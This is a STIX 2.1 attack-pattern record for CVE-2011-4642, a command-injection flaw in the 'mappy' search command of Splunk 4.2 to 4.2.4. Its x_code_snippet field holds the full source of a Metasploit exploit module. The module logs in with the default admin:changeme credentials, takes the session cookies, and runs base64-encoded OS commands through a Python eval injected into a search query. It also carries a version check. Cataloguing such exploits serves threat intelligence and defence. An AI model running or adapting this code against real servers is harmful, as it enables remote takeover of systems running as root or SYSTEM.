{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--16e1527a-ac54-44ff-96f4-3eedc5fef7eb",
    "created": "2024-08-14T17:10:26.629647Z",
    "modified": "2024-08-14T17:10:26.62965Z",
    "name": "Splunk Search Remote Code Execution",
    "description": " This module abuses a command execution vulnerability in the web based interface of Splunk 4.2 to 4.2.4. The vulnerability exists in the 'mappy' search command which allows attackers to run Python code. To exploit this vulnerability, a valid Splunk user with the admin role is required. By default, this module uses the credential of \"admin:changeme\" the default Administrator credential for Splunk. Note that the Splunk web interface runs as SYSTEM on Windows and as root on Linux by default. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/splunk_mappy_exec.rb",
            "external_id": "splunk_mappy_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4642"
        },
        {
            "source_name": "reference",
            "url": "http://www.splunk.com/view/SP-CAAAGMM"
        },
        {
            "source_name": "reference",
            "url": "http://www.sec-1.com/blog/?p=233"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Splunk Search Remote Code Execution',\n      'Description'    => %q{\n        This module abuses a command execution vulnerability in the\n        web based interface of Splunk 4.2 to 4.2.4. The vulnerability exists\n        in the 'mappy' search command which allows attackers to run Python code.\n        To exploit this vulnerability, a valid Splunk user with the admin\n        role is required. By default, this module uses the credential of \"admin:changeme\",\n        the default Administrator credential for Splunk. Note that the Splunk web interface\n        runs as SYSTEM on Windows and as root on Linux by default.\n      },\n      'Author'         =>\n        [\n          \"Gary O'Leary-Steele\", # Vulnerability discovery and exploit\n          \"juan vazquez\"         # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '77695' ],\n          [ 'BID', '51061' ],\n          [ 'CVE', '2011-4642' ],\n          [ 'URL', 'http://www.splunk.com/view/SP-CAAAGMM' ],\n          [ 'URL', 'http://www.sec-1.com/blog/?p=233' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'Badchars'    => '',\n          'DisableNops' => true\n        },\n      'Platform'       => %w{ linux unix win },\n      'Targets'        =>\n        [\n          [\n            'Universal CMD',\n            {\n              'Arch'     => ARCH_CMD,\n              'Platform' => %w{ linux unix win }\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-12-12'))\n\n      register_options(\n        [\n          Opt::RPORT(8000),\n          OptString.new('USERNAME', [ true, 'The username with admin role to authenticate as','admin' ]),\n          OptString.new('PASSWORD', [ true, 'The password for the specified username','changeme' ])\n        ])\n  end\n\n  def exploit\n    @username = datastore['USERNAME']\n    @password = datastore['PASSWORD']\n    @auth_cookies = ''\n    p = payload.encoded\n    print_status(\"Using command: #{p}\")\n    cmd = Rex::Text.encode_base64(p)\n\n    print_status(\"Attempting to login...\")\n    do_login\n\n    send_request_cgi(\n    {\n      'uri'     => '/en-US/api/search/jobs',\n      'method'  => 'POST',\n      'cookie'  => @auth_cookies,\n      'headers' =>\n        {\n          'X-Requested-With' => 'XMLHttpRequest',\n          'X-Splunk-Session' => @auth_cookies.split(\"=\")[1]\n        },\n      'vars_post' =>\n        {\n          'search' => \"search index=_internal source=*splunkd.log |mappy x=eval(\\\"sys.modules['os'].system(base64.b64decode('#{cmd}'))\\\")\",\n          'status_buckets' => \"300\",\n          'earliest_time' => \"0\",\n          'latest_time' => \"\"\n        }\n    }, 25)\n    handler\n  end\n\n  def check\n    res = send_request_cgi(\n    {\n      'uri'     => '/en-US/account/login',\n      'method'  => 'GET'\n    }, 25)\n\n    if res and res.body =~ /Splunk Inc\\. Splunk 4\\.[0-2]\\.[0-4] build [\\d+]/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def do_login\n    res = send_request_cgi(\n    {\n      'uri'     => '/en-US/account/login',\n      'method'  => 'GET'\n    }, 25)\n\n    cval = ''\n    uid = ''\n    session_id_port =\n    session_id = ''\n    if res and res.code == 200 and !res.get_cookies.empty?\n      res.get_cookies.split(';').each {|c|\n        c.split(',').each {|v|\n          if v.split('=')[0] =~ /cval/\n            cval = v.split('=')[1]\n          elsif v.split('=')[0] =~ /uid/\n            uid = v.split('=')[1]\n          elsif v.split('=')[0] =~ /session_id/\n            session_id_port = v.split('=')[0]\n            session_id = v.split('=')[1]\n          end\n        }\n      }\n    else\n      fail_with(Failure::NotFound, \"Unable to get session cookies\")\n    end\n\n    res = send_request_cgi(\n    {\n      'uri'     => '/en-US/account/login',\n      'method'  => 'POST',\n      'cookie'  => \"uid=#{uid}; #{session_id_port}=#{session_id}; cval=#{cval}\",\n      'vars_post' =>\n        {\n          'cval' => cval,\n          'username' => @username,\n          'password' => @password\n        }\n    }, 25)\n\n    if not res or res.code != 303\n      fail_with(Failure::NoAccess, \"Unable to authenticate\")\n    else\n      session_id_port = ''\n      session_id = ''\n      res.get_cookies.split(';').each {|c|\n        c.split(',').each {|v|\n          if v.split('=')[0] =~ /session_id/\n            session_id_port = v.split('=')[0]\n            session_id = v.split('=')[1]\n          end\n        }\n      }\n      @auth_cookies = \"#{session_id_port}=#{session_id}\"\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-12",
    "x_mitre_platforms": [
        "%w{ linux unix win }"
    ]
}